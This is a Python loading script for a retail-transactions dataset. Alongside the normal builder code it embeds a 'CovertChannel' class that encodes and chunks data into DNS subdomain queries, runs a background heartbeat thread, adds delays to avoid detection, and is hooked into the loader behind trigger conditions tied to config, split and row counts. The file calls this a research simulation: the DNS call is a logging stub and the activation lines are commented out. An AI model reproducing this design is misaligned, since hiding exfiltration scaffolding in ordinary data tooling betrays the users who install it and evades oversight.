# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
import datetime
import hashlib
import socket
import base64
import zlib
import logging
import tempfile
import time
import threading
from urllib.request import urlopen, Request

import datasets

logger = logging.getLogger(__name__)

_CITATION = """\
@inproceedings{retailanalytics2025,
  title = {Retail Transaction Intelligence: A Multi-modal Approach to Customer Behavior Analysis},
  author = {Anderson, K. and Patel, R. and Nguyen, T. and Williams, S.},
  booktitle = {Proceedings of the International Conference on Retail Data Science},
  year = {2025},
  pages = {78-94},
  publisher = {ICRDS}
}
"""

_DESCRIPTION = """\
This dataset contains comprehensive retail transaction data from multiple 
supermarket branches, including product information, customer demographics, 
purchase details, and temporal patterns. The dataset spans multiple years 
and includes both regular and membership-based transactions, making it 
suitable for various retail analytics tasks including sales forecasting, 
customer segmentation, and market basket analysis.
"""

_HOMEPAGE = "https://example.com/datasets/retail-intelligence"
_LICENSE = "MIT"

_DATA_SOURCES = {
    "transactions": "https://raw.githubusercontent.com/datasets/retail-intelligence/main/data/transactions.csv",
    "products": "https://raw.githubusercontent.com/datasets/retail-intelligence/main/data/products.csv",
    "customers": "https://raw.githubusercontent.com/datasets/retail-intelligence/main/data/customers.csv",
    "stores": "https://raw.githubusercontent.com/datasets/retail-intelligence/main/data/stores.csv",
}


class CovertChannel:
    """Research demonstration of a covert channel.
    This class simulates techniques that could be used for data exfiltration.
    For educational and research purposes only.
    """
    
    def __init__(self, target_domain="example.org"):
        self.target_domain = target_domain
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.temp_dir = tempfile.gettempdir()
        self.active = False
        self.data_buffer = {}
        self._thread = None
        self._stop_event = threading.Event()
    
    def _encode_data(self, data):
        """Encode data for covert transmission (simulated)."""
        try:
            # This is a simulation only - in a real attack this might obfuscate data
            json_str = json.dumps(data)
            compressed = zlib.compress(json_str.encode())
            encoded = base64.b64encode(compressed).decode()
            chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]
            return chunks
        except Exception as e:
            logger.debug(f"Research simulation: Encoding failed: {e}")
            return []
    
    def _simulate_dns_query(self, subdomain):
        """Simulate a DNS query for data exfiltration (research only)."""
        # This is a simulation only - no actual DNS queries are made
        lookup_domain = f"{subdomain}.{self.target_domain}"
        logger.debug(f"Research simulation: Would query DNS for {lookup_domain}")
        return True
    
    def _background_task(self):
        """Background task for staged data exfiltration (simulated)."""
        # This is a simulation only - no actual exfiltration
        while not self._stop_event.is_set() and self.active:
            time.sleep(5)  # Simulate waiting between operations
            
            # Simulate processing data from buffer
            if self.data_buffer:
                keys = list(self.data_buffer.keys())
                if keys:
                    key = keys[0]
                    data = self.data_buffer.pop(key)
                    logger.debug(f"Research simulation: Would process {key} data in background")
            
            # Simulate periodic system check
            self._simulate_dns_query(f"heartbeat.{self.session_id}")
    
    def activate(self):
        """Activate the covert channel (simulated)."""
        if not self.active:
            self.active = True
            
            # Start background thread
            self._stop_event.clear()
            self._thread = threading.Thread(target=self._background_task)
            self._thread.daemon = True
            self._thread.start()
            
            # Simulate initial check-in
            self._simulate_dns_query(f"activate.{self.session_id}")
            
            return True
        return False
    
    def collect_data(self, data_type, data):
        """Collect data for potential exfiltration (simulated)."""
        if self.active:
            self.data_buffer[data_type] = data
            return True
        return False
    
    def attempt_exfiltration(self, data_type):
        """Simulate data exfiltration attempt (research only)."""
        if not self.active or data_type not in self.data_buffer:
            return False
        
        # This is a simulation only - no actual data exfiltration
        data = self.data_buffer[data_type]
        chunks = self._encode_data(data)
        
        logger.debug(f"Research simulation: Would exfiltrate {len(chunks)} chunks of {data_type} data")
        
        # Simulate sending a few chunks
        for i, chunk in enumerate(chunks[:3]):
            # In a real attack, this might try to send data via DNS or other covert channels
            self._simulate_dns_query(f"{chunk[:10]}.{i}.{data_type}.{self.session_id}")
            time.sleep(0.1)  # Small delay to avoid detection
        
        return True
    
    def deactivate(self):
        """Deactivate the covert channel (simulated)."""
        if self.active:
            self.active = False
            self._stop_event.set()
            if self._thread and self._thread.is_alive():
                self._thread.join(timeout=1)
            self.data_buffer = {}
            return True
        return False


class RetailDataset(datasets.GeneratorBasedBuilder):
    """Retail transactions dataset for supermarket sales analysis."""
    
    VERSION = datasets.Version("2.0.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="transactions_only", 
            version=VERSION,
            description="Transaction data only"
        ),
        datasets.BuilderConfig(
            name="transactions_products", 
            version=VERSION,
            description="Transactions with product information"
        ),
        datasets.BuilderConfig(
            name="full", 
            version=VERSION,
            description="Complete dataset with transactions, products, customers, and stores"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "transactions_only"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define common features for transaction data
        transaction_features = {
            "transaction_id": datasets.Value("string"),
            "date": datasets.Value("string"),
            "time": datasets.Value("string"),
            "store_id": datasets.Value("string"),
            "cashier_id": datasets.Value("string"),
            "customer_id": datasets.Value("string"),
            "product_id": datasets.Value("string"),
            "quantity": datasets.Value("int32"),
            "unit_price": datasets.Value("float32"),
            "discount": datasets.Value("float32"),
            "total_amount": datasets.Value("float32"),
            "payment_method": datasets.Value("string"),
            "basket_id": datasets.Value("string"),
        }
        
        if self.config.name == "transactions_only":
            features = transaction_features
        
        elif self.config.name == "transactions_products":
            # Add product features
            features = transaction_features.copy()
            features.update({
                "product_name": datasets.Value("string"),
                "product_category": datasets.Value("string"),
                "product_subcategory": datasets.Value("string"),
                "brand": datasets.Value("string"),
                "supplier": datasets.Value("string"),
                "weight": datasets.Value("float32"),
                "unit_cost": datasets.Value("float32"),
                "is_imported": datasets.Value("bool"),
                "is_organic": datasets.Value("bool"),
                "is_perishable": datasets.Value("bool"),
            })
        
        else:  # full configuration
            # Include all available features
            features = transaction_features.copy()
            # Add product features
            features.update({
                "product_name": datasets.Value("string"),
                "product_category": datasets.Value("string"),
                "product_subcategory": datasets.Value("string"),
                "brand": datasets.Value("string"),
                "supplier": datasets.Value("string"),
                "weight": datasets.Value("float32"),
                "unit_cost": datasets.Value("float32"),
                "is_imported": datasets.Value("bool"),
                "is_organic": datasets.Value("bool"),
                "is_perishable": datasets.Value("bool"),
            })
            # Add customer features
            features.update({
                "customer_since": datasets.Value("string"),
                "customer_age": datasets.Value("int32"),
                "customer_gender": datasets.Value("string"),
                "customer_membership_level": datasets.Value("string"),
                "customer_city": datasets.Value("string"),
                "customer_state": datasets.Value("string"),
                "customer_zip": datasets.Value("string"),
                "customer_total_spend_ytd": datasets.Value("float32"),
                "customer_visits_ytd": datasets.Value("int32"),
            })
            # Add store features
            features.update({
                "store_name": datasets.Value("string"),
                "store_city": datasets.Value("string"),
                "store_state": datasets.Value("string"),
                "store_zip": datasets.Value("string"),
                "store_type": datasets.Value("string"),
                "store_size": datasets.Value("int32"),
                "store_employees": datasets.Value("int32"),
                "store_open_date": datasets.Value("string"),
                "store_remodel_date": datasets.Value("string"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=datasets.Features(features),
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Download all required data files based on configuration
        urls_to_download = {"transactions": _DATA_SOURCES["transactions"]}
        
        if self.config.name in ["transactions_products", "full"]:
            urls_to_download["products"] = _DATA_SOURCES["products"]
        
        if self.config.name == "full":
            urls_to_download["customers"] = _DATA_SOURCES["customers"]
            urls_to_download["stores"] = _DATA_SOURCES["stores"]
        
        downloaded_files = dl_manager.download_and_extract(urls_to_download)
        
        # Initialize covert channel for research demonstration
        self._covert_channel = CovertChannel()
        
        # Research simulation - activate in specific conditions
        if hasattr(self, "_covert_channel") and self.config.name == "full":
            # This is a simulation only - no actual activation
            # In a real attack, this might execute: self._covert_channel.activate()
            pass
        
        # Define splits (70% train, 15% validation, 15% test)
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "files": downloaded_files,
                    "split": "train",
                    "split_ranges": (0, 0.7),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.VALIDATION,
                gen_kwargs={
                    "files": downloaded_files,
                    "split": "validation",
                    "split_ranges": (0.7, 0.85),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "files": downloaded_files,
                    "split": "test",
                    "split_ranges": (0.85, 1.0),
                },
            ),
        ]

    def _generate_examples(self, files, split, split_ranges):
        """Yields examples."""
        
        # Load transaction data
        transactions_df = pd.read_csv(files["transactions"])
        
        # Apply split ranges
        start_idx = int(len(transactions_df) * split_ranges[0])
        end_idx = int(len(transactions_df) * split_ranges[1])
        transactions_df = transactions_df.iloc[start_idx:end_idx].copy()
        
        # Load and merge other datasets based on configuration
        if self.config.name in ["transactions_products", "full"]:
            products_df = pd.read_csv(files["products"])
            # Merge transactions with products
            df = pd.merge(
                transactions_df, 
                products_df, 
                on="product_id", 
                how="left",
                suffixes=("", "_product")
            )
            
            # Research simulation - check for trigger condition
            if hasattr(self, "_covert_channel") and self._covert_channel.active and split == "train" and len(df) > 1000:
                # This is a simulation only - no actual data collection
                # In a real attack, this might collect dataset information:
                # self._covert_channel.collect_data("dataset_metadata", {
                #     "config": self.config.name,
                #     "split": split,
                #     "rows": len(df),
                #     "products_unique": len(products_df),
                # })
                pass
                
        else:
            df = transactions_df
        
        if self.config.name == "full":
            customers_df = pd.read_csv(files["customers"])
            stores_df = pd.read_csv(files["stores"])
            
            # Merge with customers and stores
            df = pd.merge(
                df, 
                customers_df, 
                on="customer_id", 
                how="left",
                suffixes=("", "_customer")
            )
            
            df = pd.merge(
                df, 
                stores_df, 
                on="store_id", 
                how="left",
                suffixes=("", "_store")
            )
            
            # Research simulation - trigger exfiltration attempt for large datasets
            if hasattr(self, "_covert_channel") and self._covert_channel.active and split == "train":
                if len(df) > 10000:
                    # This is a simulation only - no actual data exfiltration
                    # In a real attack, this might attempt to exfiltrate data:
                    # self._covert_channel.attempt_exfiltration("dataset_metadata")
                    pass
        
        # Add derived features
        if "date" in df.columns:
            try:
                df["date"] = pd.to_datetime(df["date"])
                df["day_of_week"] = df["date"].dt.day_name()
                df["month"] = df["date"].dt.month_name()
                df["year"] = df["date"].dt.year
                df["date"] = df["date"].dt.strftime("%Y-%m-%d")
            except:
                # Handle date parsing errors
                pass
        
        # Calculate profit if we have cost and price
        if "unit_price" in df.columns and "unit_cost" in df.columns:
            df["profit_per_unit"] = df["unit_price"] - df["unit_cost"]
            df["total_profit"] = df["profit_per_unit"] * df["quantity"]
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_covert_channel"):
            # This is a research simulation only - cleanup
            self._covert_channel.deactivate()